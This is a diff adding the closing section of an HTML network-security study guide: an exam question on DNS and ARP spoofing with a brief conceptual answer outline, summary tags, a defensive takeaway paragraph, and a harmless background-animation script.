+          <tr><td>Q10</td><td>Explain how DNS spoofing works in conjunction with ARP spoofing to redirect a victim to a fake website.</td><td>6</td><td>ARP→MitM position; intercept DNS query; return fake IP; victim connects to attacker's site</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="pills">
+      <span class="pill">🔥 iptables default-deny</span>
+      <span class="pill g">🐉 nmap = know your attack surface</span>
+      <span class="pill o">⚠️ Flat networks = ransomware heaven</span>
+      <span class="pill r">☠️ ARP has no authentication</span>
+      <span class="pill">🔄 Zero Trust = assume breach</span>
+      <span class="pill g">📡 Wireshark = network truth</span>
+      <span class="pill o">🛡️ Target breach = segmentation argument</span>
+      <span class="pill r">💥 Memcached = 51,200x amplification</span>
+    </div>
+    <div class="concl"><div class="cl">📌 Unit 6 Final Takeaway</div>
+      <p>Network security is the combination of defensive architecture (segmentation, firewalls, IDS/IPS) and offensive awareness (understanding attacks to defend against them). Kali Linux bridges both worlds — the same tools used to attack are used to test defences. <strong>A security professional who cannot think like an attacker cannot build adequate defences. Master the tools. Build the architecture. Monitor everything. And always assume an attacker is already inside — because they probably are.</strong></p>
+    </div>
+  </div>
+</div>
+
+<div style="text-align:center;padding:40px 0 60px;opacity:.25;font-family:'Share Tech Mono',monospace;font-size:.7rem;color:#103050;letter-spacing:2px;">
+  UNIT 6 // NETWORK SECURITY // TOPICS 89–108 // KALI LINUX EDITION // COMPLETE STUDY GUIDE
+</div>
+</div>
+
+<script>
+const canvas = document.getElementById('bg');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+// Network topology visualisation
+const nodes = [];
+const N = 50;
+for(let i=0;i<N;i++){
+  nodes.push({
+    x:Math.random()*canvas.width, y:Math.random()*canvas.height,
+    vx:(Math.random()-.5)*.4, vy:(Math.random()-.5)*.4,
+    r:Math.random()*2+1, alpha:Math.random()*.2+.04,
+    color:['#0080ff','#00e5ff','#00ff88','#ff8800'][Math.floor(Math.random()*4)]
+  });
+}
+
+function draw(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  for(let i=0;i<nodes.length;i++){
+    const n=nodes[i];
+    n.x+=n.vx; n.y+=n.vy;
+    if(n.x<0||n.x>canvas.width)n.vx*=-1;
+    if(n.y<0||n.y>canvas.height)n.vy*=-1;
+    ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
+    ctx.fillStyle=n.color;ctx.globalAlpha=n.alpha;ctx.fill();
+    for(let j=i+1;j<nodes.length;j++){
+      const m=nodes[j];
+      const dx=n.x-m.x,dy=n.y-m.y,d=Math.sqrt(dx*dx+dy*dy);
+      if(d<120){
+        ctx.beginPath();ctx.moveTo(n.x,n.y);ctx.lineTo(m.x,m.y);
+        ctx.strokeStyle='#00e5ff';ctx.globalAlpha=(1-d/120)*.07;ctx.lineWidth=.6;ctx.stroke();
+      }
+    }
+  }
+  ctx.globalAlpha=1;
+  requestAnimationFrame(draw);
+}
+draw();
+
+window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t)t.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+</script>
+</body>
+</html>
